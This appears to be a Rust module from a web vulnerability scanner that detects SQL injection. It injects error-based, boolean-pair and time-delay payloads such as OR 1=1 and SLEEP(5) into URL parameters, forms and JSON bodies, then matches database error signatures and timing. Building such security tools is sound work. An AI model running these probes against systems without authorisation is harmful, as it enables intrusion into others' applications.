use crate::commands::webscout::common::constants::{
  EVIDENCE_SQLI_BOOLEAN, EVIDENCE_SQLI_BOOLEAN_MID, EVIDENCE_SQLI_BOOLEAN_SUFFIX,
  EVIDENCE_SQLI_ERROR_PREFIX, EVIDENCE_SQLI_TIME_BASE, EVIDENCE_SQLI_TIME_MID,
  EVIDENCE_SQLI_TIME_NO_BASE, EVIDENCE_SQLI_TIME_SUFFIX, MODULE_SQLI,
};
use crate::commands::webscout::common::http;
use crate::commands::webscout::crawl::parser;
use crate::commands::webscout::test::probe;
use std::collections::HashSet;

const PAYLOADS: &[&str] = &["'", "\"", "1; SELECT 1--"];

const BOOLEAN_PAIRS: &[(&str, &str)] = &[
  ("' OR '1'='1'--", "' AND '1'='2'--"),
  ("' OR 1=1--", "' AND 1=2--"),
  ("') OR ('1'='1", "') AND ('1'='2"),
];

const TIME_PAYLOADS: &[&str] = &[
  "' OR SLEEP(5)--",
  "'; SELECT SLEEP(5)--",
  "' OR pg_sleep(5)--",
  "'; SELECT pg_sleep(5)--",
  "'; WAITFOR DELAY '0:0:5'--",
  "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))x)--",
];

const TIME_DELAY_THRESHOLD_MS: u64 = 4000;
const TIME_DELAY_DELTA_MS: u64 = 3500;
const BASELINE_PAYLOAD: &str = "test";

const ERROR_SIGNATURES: &[&str] = &[
  "you have an error in your sql syntax",
  "mysql_fetch",
  "mysql_num_rows",
  "supplied argument is not a valid mysql",
  "pg_query()",
  "pg_exec()",
  "unterminated quoted string",
  "syntax error at or near",
  "sqlite3",
  "sqlite_",
  "ora-01",
  "ora-00",
  "oracle error",
  "unclosed quotation mark",
  "incorrect syntax near",
  "microsoft ole db provider for sql server",
  "sqlstate",
  "sql syntax",
  "syntax error",
  "database error",
  "db error",
  "query failed",
];

pub fn run(
  forms: &[parser::FormInfo],
  url: &str,
  client: &http::HttpClient,
  json_body: Option<&serde_json::Value>,
) -> probe::ModuleReport {
  let mut findings = Vec::new();
  let mut tested = Vec::new();

  for payload in PAYLOADS {
    for result in probe_sources(forms, url, client, json_body, payload) {
      if let Some(f) = check(&result) {
        findings.push(f);
      }
      tested.push(probe::TestedItem {
        url: result.url.clone(),
        param: result.param.clone(),
        payload: result.payload.clone(),
      });
    }
  }

  let (b_findings, b_tested) = run_boolean_based(forms, url, client, json_body);
  findings.extend(b_findings);
  tested.extend(b_tested);

  let (t_findings, t_tested) = run_time_based(forms, url, client, json_body);
  findings.extend(t_findings);
  tested.extend(t_tested);

  dedup_findings(&mut findings);

  probe::ModuleReport { findings, tested }
}

fn probe_sources(
  forms: &[parser::FormInfo],
  url: &str,
  client: &http::HttpClient,
  json_body: Option<&serde_json::Value>,
  payload: &str,
) -> Vec<probe::ProbeResult> {
  let mut results = probe::probe_url_params(client, url, payload);

  for form in forms {
    results.extend(probe::probe_form(client, form, payload));
  }

  if let Some(template) = json_body {
    results.extend(probe::probe_json_body(client, url, template, payload));
  }

  results
}

fn check(result: &probe::ProbeResult) -> Option<probe::Finding> {
  let body_lower = result.response.body.to_lowercase();

  let evidence = ERROR_SIGNATURES
    .iter()
    .find(|sig| body_lower.contains(*sig))?;

  Some(probe::Finding {
    module: MODULE_SQLI,
    url: result.url.clone(),
    param: result.param.clone(),
    payload: result.payload.clone(),
    evidence: format!(
      "{} {}",
      EVIDENCE_SQLI_ERROR_PREFIX,
      extract_context(&result.response.body, evidence)
    ),
  })
}

fn run_boolean_based(
  forms: &[parser::FormInfo],
  url: &str,
  client: &http::HttpClient,
  json_body: Option<&serde_json::Value>,
) -> (Vec<probe::Finding>, Vec<probe::TestedItem>) {
  let mut findings = Vec::new();
  let mut tested = Vec::new();

  for (true_payload, false_payload) in BOOLEAN_PAIRS {
    let true_results = probe::probe_url_params(client, url, true_payload);
    let false_results = probe::probe_url_params(client, url, false_payload);
    findings.extend(compare_pairs(&true_results, &false_results));
    tested.extend(true_results.iter().map(to_tested));
    tested.extend(false_results.iter().map(to_tested));

    for form in forms {
      let true_results = probe::probe_form(client, form, true_payload);
      let false_results = probe::probe_form(client, form, false_payload);
      findings.extend(compare_pairs(&true_results, &false_results));
      tested.extend(true_results.iter().map(to_tested));
      tested.extend(false_results.iter().map(to_tested));
    }

    if let Some(template) = json_body {
      let true_results = probe::probe_json_body(client, url, template, true_payload);
      let false_results = probe::probe_json_body(client, url, template, false_payload);
      findings.extend(compare_pairs(&true_results, &false_results));
      tested.extend(true_results.iter().map(to_tested));
      tested.extend(false_results.iter().map(to_tested));
    }
  }

  (findings, tested)
}

fn compare_pairs(
  true_results: &[probe::ProbeResult],
  false_results: &[probe::ProbeResult],
) -> Vec<probe::Finding> {
  let mut findings = Vec::new();

  for t in true_results {
    let Some(f) = false_results.iter().find(|r| r.param == t.param) else {
      continue;
    };

    if has_error_signature(&t.response.body) || has_error_signature(&f.response.body) {
      continue;
    }

    let len_t = t.response.body.len();
    let len_f = f.response.body.len();
    let diff = len_t.abs_diff(len_f);
    let threshold = (len_t.max(len_f) / 20).max(10);

    if diff > threshold {
      findings.push(probe::Finding {
                module: MODULE_SQLI,
                url: t.url.clone(),
                param: t.param.clone(),
                payload: format!("{} / {}", t.payload, f.payload),
                evidence: format!(
                    "{EVIDENCE_SQLI_BOOLEAN} ({len_t} bytes) {EVIDENCE_SQLI_BOOLEAN_MID} ({len_f} bytes) {EVIDENCE_SQLI_BOOLEAN_SUFFIX}"
                ),
            });
    }
  }

  findings
}

fn run_time_based(
  forms: &[parser::FormInfo],
  url: &str,
  client: &http::HttpClient,
  json_body: Option<&serde_json::Value>,
) -> (Vec<probe::Finding>, Vec<probe::TestedItem>) {
  let mut findings = Vec::new();
  let mut tested = Vec::new();
  let baseline = probe_sources(forms, url, client, json_body, BASELINE_PAYLOAD);

  for payload in TIME_PAYLOADS {
    for result in probe_sources(forms, url, client, json_body, payload) {
      let baseline_ms = baseline
        .iter()
        .find(|r| r.url == result.url && r.param == result.param)
        .map(|r| r.response.duration_ms);

      if let Some(f) = check_time_based(&result, baseline_ms) {
        findings.push(f);
      }
      tested.push(to_tested(&result));
    }
  }

  (findings, tested)
}

fn check_time_based(
  result: &probe::ProbeResult,
  baseline_ms: Option<u64>,
) -> Option<probe::Finding> {
  let duration = result.response.duration_ms;

  match baseline_ms {
    Some(base) => {
      let delta = duration.saturating_sub(base);
      if delta < TIME_DELAY_DELTA_MS {
        return None;
      }

      Some(probe::Finding {
        module: MODULE_SQLI,
        url: result.url.clone(),
        param: result.param.clone(),
        payload: result.payload.clone(),
        evidence: format!(
          "{EVIDENCE_SQLI_TIME_BASE}{duration}ms vs {base}ms {EVIDENCE_SQLI_TIME_MID} (+{delta}ms) {EVIDENCE_SQLI_TIME_SUFFIX}"
        ),
      })
    }
    None => {
      if duration < TIME_DELAY_THRESHOLD_MS {
        return None;
      }

      Some(probe::Finding {
        module: MODULE_SQLI,
        url: result.url.clone(),
        param: result.param.clone(),
        payload: result.payload.clone(),
        evidence: format!("{EVIDENCE_SQLI_TIME_BASE}{duration}ms {EVIDENCE_SQLI_TIME_NO_BASE}"),
      })
    }
  }
}

fn has_error_signature(body: &str) -> bool {
  let lower = body.to_lowercase();
  ERROR_SIGNATURES.iter().any(|sig| lower.contains(*sig))
}

fn extract_context(body: &str, signature: &str) -> String {
  let lower = body.to_lowercase();
  let pos = match lower.find(signature) {
    Some(p) => p,
    None => return signature.to_string(),
  };
  let start = pos.saturating_sub(40);
  let end = (pos + signature.len() + 40).min(body.len());
  body[start..end].replace('\n', " ").trim().to_string()
}

fn to_tested(r: &probe::ProbeResult) -> probe::TestedItem {
  probe::TestedItem {
    url: r.url.clone(),
    param: r.param.clone(),
    payload: r.payload.clone(),
  }
}

fn dedup_findings(findings: &mut Vec<probe::Finding>) {
  let mut seen: HashSet<(String, String, String, String)> = HashSet::new();
  findings.retain(|f| {
    seen.insert((
      f.url.clone(),
      f.param.clone(),
      f.payload.clone(),
      f.evidence.clone(),
    ))
  });
}
